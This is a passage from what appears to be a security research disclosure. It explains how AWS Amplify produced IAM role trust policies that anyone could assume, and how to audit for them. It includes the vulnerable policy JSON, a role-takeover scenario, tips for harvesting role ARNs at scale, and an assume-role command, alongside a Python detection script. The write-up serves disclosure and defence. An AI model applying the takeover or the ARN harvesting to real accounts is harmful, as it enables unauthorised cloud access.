                <span class="token property">"Federated"</span><span class="token operator">:</span> <span class="token string">"cognito-identity.amazonaws.com"</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token string">"sts:AssumeRoleWithWebIdentity"</span><span class="token punctuation">,</span>
            <span class="token property">"Condition"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token property">"StringEquals"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token property">"cognito-identity.amazonaws.com:aud"</span><span class="token operator">:</span> <span class="token string">"&lt;Cognito Identity Pool Id>"</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token property">"ForAnyValue:StringLike"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token property">"cognito-identity.amazonaws.com:amr"</span><span class="token operator">:</span> <span class="token string">"&lt;authenticated || unauthenticated>"</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">}</span></code></pre>
<p>Again, this role trust policy is safe. It enforces which identity pool can be used to assume the role.</p>
<p>Now, if at any time you chose to remove the authentication component from your Amplify app, Amplify would delete those Cognito resources on the backend and modify the role trust policy of both the <code>auth</code> and <code>unauth</code> roles. It would modify the role trust policy to the following:</p>
<pre class="language-json"><code class="language-json"><span class="highlight-line"><span class="token punctuation">{</span></span>
<span class="highlight-line">    <span class="token property">"Version"</span><span class="token operator">:</span> <span class="token string">"2012-10-17"</span><span class="token punctuation">,</span></span>
<span class="highlight-line">    <span class="token property">"Statement"</span><span class="token operator">:</span> <span class="token punctuation">[</span></span>
<span class="highlight-line">        <span class="token punctuation">{</span></span>
<mark class="highlight-line highlight-line-active">            <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Allow"</span><span class="token punctuation">,</span></mark>
<span class="highlight-line">            <span class="token property">"Principal"</span><span class="token operator">:</span> <span class="token punctuation">{</span></span>
<span class="highlight-line">                <span class="token property">"Federated"</span><span class="token operator">:</span> <span class="token string">"cognito-identity.amazonaws.com"</span></span>
<span class="highlight-line">            <span class="token punctuation">}</span><span class="token punctuation">,</span></span>
<span class="highlight-line">            <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token string">"sts:AssumeRoleWithWebIdentity"</span></span>
<span class="highlight-line">        <span class="token punctuation">}</span></span>
<span class="highlight-line">    <span class="token punctuation">]</span></span>
<span class="highlight-line"><span class="token punctuation">}</span></span></code></pre>
<p>We've found it! This is the vulnerable configuration that, as we previously demonstrated, made a role assumable by anyone in the world. <strong>Any user who removed the authentication component from their Amplify project for any reason, intentional or not, would have the role trust policy changed to be open to the world</strong>. Especially for the <code>authRole</code>, this is explicitly <strong>not</strong> what developers would intend. <strong>Both the Amplify Studio and Amplify CLI exhibited this behavior</strong>.</p>
<p>In speaking with customers who were affected, we found the most common reason they removed this component was because a project started with the built-in Cognito resources, then later moved to an external (i.e., outside of Amplify) Cognito user or identity pool, or to a separate identity provider entirely. Amplify users were given no indication that an AWS service or tool was exposing their IAM roles in this way.</p>
<p>We will refer to this version of the vulnerability (without a <code>Condition</code> element) as &quot;variant one&quot; for the remainder of this article.</p>
<p>One challenge of cloud security research is that the services offered by cloud providers are often opaque. They take inputs and return outputs. Any changes to this are usually invisible to outside observers and researchers. However, this is a rare circumstance in which the vulnerable component is in an open source library, and as a result, we can track down when this vulnerable behavior was introduced.</p>
<p>By looking at the <a href="https://github.com/aws-amplify/amplify-cli/blob/ccfd5085dc8fdbaf90d3a3646e8c10e26a5f583d/packages/amplify-provider-awscloudformation/lib/update-idp-roles-cfn.json">commit history</a> of the <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/Welcome.html">Cloudformation</a> template in the Amplify CLI, it appears that this vulnerability was introduced in August 2019. In speaking with the team at AWS, we learned that the Amplify Studio makes use of parts of the CLI. Based on this fact, the timeline of the fixes for both, and that both displayed the same vulnerable behavior at time of discovery, it is safe to assume that the Amplify Studio was also affected around that time.</p>
<h3 id="variant-two" tabindex="-1"><a class="header-anchor" href="#variant-two">Variant two</a></h3>
<p>After contacting AWS, we began identifying Datadog customers who had vulnerable IAM roles that could be taken over and proactively reaching out to them.</p>
<p>While investigating this, we noticed a strange trend. While the majority of vulnerable roles featured the  variant one trust policy above, many featured a different but just as vulnerable policy (which we will refer to as &quot;variant two&quot;):</p>
<pre class="language-json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"Version"</span><span class="token operator">:</span> <span class="token string">"2012-10-17"</span><span class="token punctuation">,</span>
    <span class="token property">"Statement"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">{</span>
            <span class="token property">"Sid"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
            <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Allow"</span><span class="token punctuation">,</span>
            <span class="token property">"Principal"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token property">"Federated"</span><span class="token operator">:</span> <span class="token string">"cognito-identity.amazonaws.com"</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token string">"sts:AssumeRoleWithWebIdentity"</span><span class="token punctuation">,</span>
            <span class="token property">"Condition"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token property">"ForAnyValue:StringLike"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token property">"cognito-identity.amazonaws.com:amr"</span><span class="token operator">:</span> <span class="token string">"authenticated"</span><span class="token punctuation">,</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">}</span></code></pre>
<p>Misconfigurations with variant two could have either <code>authenticated</code> or <code>unauthenticated</code> for the value of <code>cognito-identity.amazonaws.com:amr</code> and featured the same naming convention of ending in <code>authRole</code> or <code>unauthRole</code>.</p>
<p>The problem, however, was that we could not determine what was causing roles to be misconfigured in this way. We exhausted every possible functionality of Amplify and considered the possibility that it was a combination of two or more factors, but none of these efforts resulted in a misconfigured policy that featured the vulnerable <code>Condition</code> element.</p>
<p>After spending time trying to identify what was making IAM roles vulnerable to variant two, we took a different approach: We produced a list of all roles we could find that were vulnerable to this variant and noticed that none of the roles featured the (presumably newer) six-digit identifier. Additionally, the most recent timestamp we found vulnerable to variant two was from July 2019. This was, crucially, a single month before the commit we identified that made IAM roles vulnerable to variant one.</p>
<p>This information suggested that the misconfiguration may have been older than originally thought. Indeed, on July 3, 2018, a <a href="https://github.com/aws-amplify/amplify-cli/blob/3ee001138487d07fd175a19832fc554b6728fd5c/packages/amplify-provider-awscloudformation/lib/rootStackTemplate.json">commit</a> was made that set the default role trust policy for the <code>auth</code> and <code>unauth</code> roles to match what we found in variant two.</p>
<pre class="language-json"><code class="language-json"><span class="token punctuation">[</span>... snip ...<span class="token punctuation">]</span>
        <span class="token property">"AuthRole"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token property">"Type"</span><span class="token operator">:</span> <span class="token string">"AWS::IAM::Role"</span><span class="token punctuation">,</span>
            <span class="token property">"Properties"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token property">"RoleName"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"Ref"</span><span class="token operator">:</span> <span class="token string">"AuthRoleName"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token property">"AssumeRolePolicyDocument"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                  <span class="token property">"Version"</span><span class="token operator">:</span> <span class="token string">"2012-10-17"</span><span class="token punctuation">,</span>
                  <span class="token property">"Statement"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
                    <span class="token punctuation">{</span>
                      <span class="token property">"Sid"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
                      <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Allow"</span><span class="token punctuation">,</span>
                      <span class="token property">"Principal"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                        <span class="token property">"Federated"</span><span class="token operator">:</span> <span class="token string">"cognito-identity.amazonaws.com"</span>
                      <span class="token punctuation">}</span><span class="token punctuation">,</span>
                      <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token string">"sts:AssumeRoleWithWebIdentity"</span><span class="token punctuation">,</span>
                      <span class="token property">"Condition"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                        <span class="token property">"ForAnyValue:StringLike"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                          <span class="token property">"cognito-identity.amazonaws.com:amr"</span><span class="token operator">:</span> <span class="token string">"authenticated"</span>
                        <span class="token punctuation">}</span>
                      <span class="token punctuation">}</span>
<span class="token punctuation">[</span>... snip ...<span class="token punctuation">]</span></code></pre>
<p>This is important because, unlike variant one, there were no additional steps required to make an IAM role vulnerable. <strong>The &quot;variant two&quot; misconfiguration was the default, out-of-the-box configuration for both <code>auth</code> and <code>unauth</code> roles</strong>. If you created an Amplify project using the Amplify CLI built between July 3, 2018 and August 8, 2019, your Amplify projectâs IAM roles were assumable by anyone in the world.</p>
<p>On August 8, 2019, a <a href="https://github.com/aws-amplify/amplify-cli/commit/ccfd5085dc8fdbaf90d3a3646e8c10e26a5f583d">commit</a> was made that unintentionally fixed the behavior creating IAM roles vulnerable to variant two. This corroborates our earlier finding that roles that were vulnerable to variant two did not have timestamps beyond July 2019.</p>
<p>Unlike with variant one, we cannot definitively say that the Amplify Studio created roles vulnerable to variant two. While we believe there is strong evidence to assume this, considering how close the two are and the fact that these changes correlate to the right time period, the behavior was no longer present by the time we were able to investigate.</p>
<h2 id="compounding-factors-increasing-severity" tabindex="-1"><a class="header-anchor" href="#compounding-factors-increasing-severity">Compounding factors increasing severity</a></h2>
<p>For an adversary looking to break into an AWS account, finding publicly exposed IAM roles provides initial access to an AWS environment without any authentication or authorization. The misconfiguration that AWS Amplify caused is similar to a <a href="https://hackingthe.cloud/aws/exploitation/Misconfigured_Resource-Based_Policies/misconfigured_iam_role_trust_policy_wildcard_principal/">wildcard Principal</a> in a role trust policy with an extra step.</p>
<p>With this in mind, three compounding factors made this particular vulnerability even more severe.</p>
<h3 id="1-amplify-roles-maintained-their-privileges-after-authentication-was-removed" tabindex="-1"><a class="header-anchor" href="#1-amplify-roles-maintained-their-privileges-after-authentication-was-removed">1. Amplify roles maintained their privileges after authentication was removed</a></h3>
<p>When Amplify modified the role trust policy to allow anyone to assume these roles in a victim account, it did not modify the IAM policies associated with those roles. If a role had privileges to call an API, access an S3 bucket, or read from a DynamoDB table, it could still perform those tasks. In addition, Amplify users could manually modify these IAM roles and attach arbitrary IAM policies to them. <strong>Across Datadog customers, we found vulnerable IAM roles that had a variety of &quot;full access&quot; policies attached, including <code>AmazonS3FullAccess</code> and <code>AmazonKinesisFullAccess</code></strong>.</p>
<p>Because AWS exposed these roles such that anyone in the world could assume them, and because the roles maintained their privileges, an adversary abusing this vulnerability would not only have initial access to the AWS accountâthey would also have privileges over resources under the purview of those roles.</p>
<h3 id="2-potentially-vulnerable-role-arns-are-easily-discoverable" tabindex="-1"><a class="header-anchor" href="#2-potentially-vulnerable-role-arns-are-easily-discoverable">2. Potentially vulnerable role ARNs are easily discoverable</a></h3>
<p>The second factor that increased the likelihood of exploitation is the nature of Amplify and Cognito identity pools. In order to assume the role, an adversary would need to know that roleâs ARN. While an ARN is not considered a secret in the same way a password or API key is, finding an ARN is still a challenge that an attacker needs to solve. If this issue impacted <em>any</em> IAM role, an adversary would need to enumerate the ARN through some of the methods weâve already described, or search for ARNs after gaining a foothold in a victim environment.</p>
<p>However, the nature of Amplify and Cognito identity pools reduces the effort involved in gathering large numbers of IAM role ARNs. These roles are designed for users of Amplify applications and intended to be distributed publicly. Furthermore, a motivated adversary could have simply crawled the internet for Amplify/Cognito-enabled applications, pulled role ARNs or identity pool IDs from their associated JavaScript, and tested if they were vulnerable. Additionally, the role names are (by default) deterministic. If you find an <code>unauthRole</code> from a victim application, you will know the role ARN of the <code>authRole</code>.</p>
<p>As an example of how this could quickly be scaled, an adversary could programmatically search Google for Amplify apps based on their domain. In a quick search, an adversary could find tens of thousands of applications to check for vulnerable roles.</p>
<figure class="mt-4">
        <a href="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/amplify-google-count.png?auto=format" target="SecurityLabsTab"><img
          class="w-full mx-auto" width="800" style="max-width: 800px;"
          srcset="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/amplify-google-count.png?auto=format&w=800&dpr=1.75 1x, https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/amplify-google-count.png?auto=format&w=800&dpr=2&q=75 2x, https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/amplify-google-count.png?auto=format&w=800&dpr=3&q=55 3x" 
          src="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/amplify-google-count.png?auto=format&w=800&dpr=1.75"
          alt="Finding Amplify apps using Google"
          loading="lazy">
        <figcaption class="text-gray-500 mt-4 mx-auto w-max max-w-full">Finding Amplify apps using Google</figcaption></a> 
      </figure>
<p>While not every Amplify app would have been vulnerable, an attacker would be likely to find vulnerable roles over a large enough dataset.</p>
<p>Andres Riancho explored another potential method for accumulating role ARNs in his 2019 Black Hat USA talk, &quot;<a href="https://www.youtube.com/watch?v=_Ek0F-Xh57w">Internet-Scale Analysis of AWS Cognito Security</a>&quot;. He describes his methodology of finding large numbers of Cognito identity pool IDs by searching through <a href="https://commoncrawl.org/">Common Crawl</a> data, an archive of internet content.</p>
<h3 id="3-exposure-started-years-ago" tabindex="-1"><a class="header-anchor" href="#3-exposure-started-years-ago">3. Exposure started years ago</a></h3>
<p>As mentioned earlier, both variants of this issue have been around for years. Because of this, an unknown number of IAM roles could have been made vulnerable in that time and could have been used to gain initial access to AWS organizations that had them.</p>
<h2 id="an-example-of-how-this-could-be-exploited" tabindex="-1"><a class="header-anchor" href="#an-example-of-how-this-could-be-exploited">An example of how this could be exploited</a></h2>
<p>For a practical example of how an adversary could exploit this vulnerability prior to AWS mitigation efforts, imagine a hypothetical document storage application. This application can <a href="https://docs.amplify.aws/javascript/build-a-backend/auth/set-up-auth/">authenticate</a> users via single sign-on and requires MFA. Once authenticated, users can upload documents to S3 via the web application and interact with API gateways that authenticate using IAM credentials.</p>
<figure class="mt-4">
        <a href="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/original-configuration.png?auto=format" target="SecurityLabsTab"><img
          class="w-full mx-auto" width="800" style="max-width: 800px;"
          srcset="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/original-configuration.png?auto=format&w=800&dpr=1.75 1x, https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/original-configuration.png?auto=format&w=800&dpr=2&q=75 2x, https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/original-configuration.png?auto=format&w=800&dpr=3&q=55 3x" 
          src="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/original-configuration.png?auto=format&w=800&dpr=1.75"
          alt="An example Amplify app using Cognito"
          loading="lazy">
        <figcaption class="text-gray-500 mt-4 mx-auto w-max max-w-full">An example Amplify app using Cognito</figcaption></a> 
      </figure>
<p>However, because of this vulnerability, if the authentication component was removed from the Amplify projectâwhich could occur while moving to a new identity provider, as mentioned previouslyâAmplify would modify the IAM roleâs trust policy to be open to the world:</p>
<pre class="language-json"><code class="language-json"><span class="highlight-line"><span class="token punctuation">{</span></span>
<span class="highlight-line">    <span class="token property">"Version"</span><span class="token operator">:</span> <span class="token string">"2012-10-17"</span><span class="token punctuation">,</span></span>
<span class="highlight-line">    <span class="token property">"Statement"</span><span class="token operator">:</span> <span class="token punctuation">[</span></span>
<span class="highlight-line">        <span class="token punctuation">{</span></span>
<mark class="highlight-line highlight-line-active">            <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Allow"</span><span class="token punctuation">,</span></mark>
<span class="highlight-line">            <span class="token property">"Principal"</span><span class="token operator">:</span> <span class="token punctuation">{</span></span>
<span class="highlight-line">                <span class="token property">"Federated"</span><span class="token operator">:</span> <span class="token string">"cognito-identity.amazonaws.com"</span></span>
<span class="highlight-line">            <span class="token punctuation">}</span><span class="token punctuation">,</span></span>
<span class="highlight-line">            <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token string">"sts:AssumeRoleWithWebIdentity"</span></span>
<span class="highlight-line">        <span class="token punctuation">}</span></span>
<span class="highlight-line">    <span class="token punctuation">]</span></span>
<span class="highlight-line"><span class="token punctuation">}</span></span></code></pre>
<p>From here, an adversary could follow the steps we covered in the &quot;<a href="/articles/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/#potential-misconfiguration-1-trust-policy-without-a-condition">Potential misconfiguration 1: Trust policy without a condition</a>&quot; section above. They could create an Identity pool in their own account and use <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/assume-role-with-web-identity.html">sts:AssumeRoleWithWebIdentity</a> to assume the vulnerable IAM role. No further authentication or authorization would be required.</p>
<figure class="mt-4">
        <a href="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/exploitation.png?auto=format" target="SecurityLabsTab"><img
          class="w-full mx-auto" width="800" style="max-width: 800px;"
          srcset="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/exploitation.png?auto=format&w=800&dpr=1.75 1x, https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/exploitation.png?auto=format&w=800&dpr=2&q=75 2x, https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/exploitation.png?auto=format&w=800&dpr=3&q=55 3x" 
          src="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/exploitation.png?auto=format&w=800&dpr=1.75"
          alt="Exploiting a vulnerable Amplify app"
          loading="lazy">
        <figcaption class="text-gray-500 mt-4 mx-auto w-max max-w-full">Exploiting a vulnerable Amplify app</figcaption></a> 
      </figure>
<h2 id="aws-response" tabindex="-1"><a class="header-anchor" href="#aws-response">AWS response</a></h2>
<p>As a result of our research and subsequent disclosure, AWS released fixes in early January to Amplify to ensure that it no longer created misconfigured roles. <strong>However, this did not resolve the problem that there were an unknown number of IAM roles out there that were already made vulnerable</strong>.</p>
<p>In late February, AWS rolled out an enhancement to its Security Token Service (STS) that makes exploiting roles with variant one misconfigured trust policies no longer possible in cross-account scenarios. As an example, attempting to assume a role with the following trust policy will return an error.</p>
<pre class="language-json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"Version"</span><span class="token operator">:</span> <span class="token string">"2012-10-17"</span><span class="token punctuation">,</span>
    <span class="token property">"Statement"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">{</span>
            <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Allow"</span><span class="token punctuation">,</span>
            <span class="token property">"Principal"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token property">"Federated"</span><span class="token operator">:</span> <span class="token string">"cognito-identity.amazonaws.com"</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token string">"sts:AssumeRoleWithWebIdentity"</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-shell"><code class="language-shell">nick.frichette@host % aws sts assume-role-with-web-identity <span class="token punctuation">\</span>
--role-arn arn:aws:iam::111111111111:role/vulnerable-authRole <span class="token punctuation">\</span>
--role-session-name blah <span class="token punctuation">\</span>
--web-identity-token <span class="token punctuation">[</span>truncated<span class="token punctuation">]</span>

An error occurred <span class="token punctuation">(</span>AccessDenied<span class="token punctuation">)</span> when calling the AssumeRoleWithWebIdentity operation: Not authorized to perform sts:AssumeRoleWithWebIdentity</code></pre>
<p>This change ensured that customers who unknowingly had vulnerable roles in their accounts could not be exploited. Additionally, AWS added an extra check to prevent customers (or even other software layers such as Amplify) from creating this class of vulnerable role entirely.</p>
<figure class="mt-4">
        <a href="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/blocked-vulnerable-policy.png?auto=format" target="SecurityLabsTab"><img
          class="w-full mx-auto" width="800" style="max-width: 800px;"
          srcset="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/blocked-vulnerable-policy.png?auto=format&w=800&dpr=1.75 1x, https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/blocked-vulnerable-policy.png?auto=format&w=800&dpr=2&q=75 2x, https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/blocked-vulnerable-policy.png?auto=format&w=800&dpr=3&q=55 3x" 
          src="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/blocked-vulnerable-policy.png?auto=format&w=800&dpr=1.75"
          alt="Blocked vulnerable policy"
          loading="lazy">
        <figcaption class="text-gray-500 mt-4 mx-auto w-max max-w-full">Blocked vulnerable policy</figcaption></a> 
      </figure>
<p>Later, in April, AWS added an additional STS enhancement that protects against cross-account role assumption of roles that are misconfigured with variant two. Now, if a role is misconfigured with a <code>Condition</code> element for <code>cognito-identity.amazonaws.com:amr</code>, customers will not be able to assume the role.</p>
<h2 id="how-to-know-if-youre-affected" tabindex="-1"><a class="header-anchor" href="#how-to-know-if-youre-affected">How to know if you're affected</a></h2>
<p>If your organization uses AWS Amplify or has in the past, we recommend performing an audit of your roles and potential threat activity via the steps below.</p>
<h3 id="identifying-vulnerable-iam-roles" tabindex="-1"><a class="header-anchor" href="#identifying-vulnerable-iam-roles">Identifying vulnerable IAM roles</a></h3>
<p>To easily determine if an IAM role was vulnerable in your account, you can use the following Python script to check. Ensure that your shell has <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html">credentials</a> configured.</p>
<pre class="language-python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> boto3
client <span class="token operator">=</span> boto3<span class="token punctuation">.</span>client<span class="token punctuation">(</span><span class="token string">'iam'</span><span class="token punctuation">)</span>

roles <span class="token operator">=</span> <span class="token punctuation">[</span>role <span class="token keyword">for</span> result <span class="token keyword">in</span> client<span class="token punctuation">.</span>get_paginator<span class="token punctuation">(</span><span class="token string">'list_roles'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>paginate<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> role <span class="token keyword">in</span> result<span class="token punctuation">[</span><span class="token string">'Roles'</span><span class="token punctuation">]</span> <span class="token punctuation">]</span>

vulnerable_roles <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> role <span class="token keyword">in</span> roles<span class="token punctuation">:</span>
    assume_role_policy_statements <span class="token operator">=</span> role<span class="token punctuation">[</span><span class="token string">'AssumeRolePolicyDocument'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'Statement'</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> statement <span class="token keyword">in</span> assume_role_policy_statements<span class="token punctuation">:</span>
        <span class="token keyword">if</span> statement<span class="token punctuation">[</span><span class="token string">'Effect'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'Allow'</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">if</span> <span class="token string">"Federated"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> statement<span class="token punctuation">[</span><span class="token string">'Principal'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">if</span> statement<span class="token punctuation">[</span><span class="token string">'Principal'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'Federated'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"cognito-identity.amazonaws.com"</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">if</span> statement<span class="token punctuation">[</span><span class="token string">'Action'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"sts:AssumeRoleWithWebIdentity"</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>

        vulnerable_condition <span class="token operator">=</span> <span class="token boolean">False</span>
        <span class="token keyword">if</span> <span class="token string">"Condition"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> statement<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            vulnerable_condition <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">elif</span> statement<span class="token punctuation">[</span><span class="token string">'Condition'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">:</span>
            vulnerable_condition <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            vulnerable_condition <span class="token operator">=</span> <span class="token boolean">True</span>
            <span class="token keyword">for</span> condition_element <span class="token keyword">in</span> statement<span class="token punctuation">[</span><span class="token string">'Condition'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                <span class="token keyword">if</span> <span class="token string">"cognito-identity.amazonaws.com:aud"</span> <span class="token keyword">in</span> statement<span class="token punctuation">[</span><span class="token string">'Condition'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>condition_element<span class="token punctuation">]</span><span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    vulnerable_condition <span class="token operator">=</span> <span class="token boolean">False</span>
    
        <span class="token keyword">if</span> vulnerable_condition<span class="token punctuation">:</span>
            vulnerable_roles<span class="token punctuation">.</span>append<span class="token punctuation">(</span>role<span class="token punctuation">[</span><span class="token string">'Arn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>vulnerable_roles<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No vulnerable roles found"</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'Found </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>vulnerable_roles<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string"> vulnerable roles:\n'</span></span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> role <span class="token keyword">in</span> vulnerable_roles<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>role<span class="token punctuation">)</span>
</code></pre>
<h3 id="identifying-vulnerable-identity-pools" tabindex="-1"><a class="header-anchor" href="#identifying-vulnerable-identity-pools">Identifying vulnerable identity pools</a></h3>
<p>It is important to note that while you can no longer assume a role that is vulnerable to variant one or two from an external AWS account, you can still assume those roles using an identity pool in the same account. If your AWS account has a vulnerable role and an identity pool with the <a href="https://docs.aws.amazon.com/cognito/latest/developerguide/authentication-flow.html">basic authflow</a> enabled, an adversary could potentially use that pool via <a href="https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-web-identity.html">sts:AssumeRoleWithWebIdentity</a> to assume the vulnerable role, resulting in potential privilege escalation.</p>
<p>For this reason, we recommend disabling the basic (classic) authflow for identity pools.</p>
<h3 id="identifying-threat-actor-activity-in-your-environment" tabindex="-1"><a class="header-anchor" href="#identifying-threat-actor-activity-in-your-environment">Identifying threat actor activity in your environment</a></h3>
<p>If an external adversary attempted to assume a role in your AWS account using this technique, the activity would generate an <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/assume-role-with-web-identity.html">sts:AssumeRoleWithWebIdentity</a> CloudTrail event. This event would contain the following elements:</p>
<pre><code>{
    &quot;userIdentity&quot;: {
	    &quot;Type&quot;: &quot;WebIdentityUser&quot;,
        &quot;identityProvider&quot;: &quot;cognito-identity.amazonaws.com&quot;,
        &quot;principalId&quot;: &quot;cognito-identity.amazonaws.com:&lt;identity pool id&gt;:&lt;identity id&gt;&quot;,
        &quot;userName&quot;: &quot;&lt;identity id&gt;&quot;
    },
    &quot;responseElements&quot;: {
        &quot;assumedRoleUser&quot;: {
            &quot;arn&quot;: &quot;arn:aws:sts::111111111111:assumed-role/victim-role/hacked&quot;,
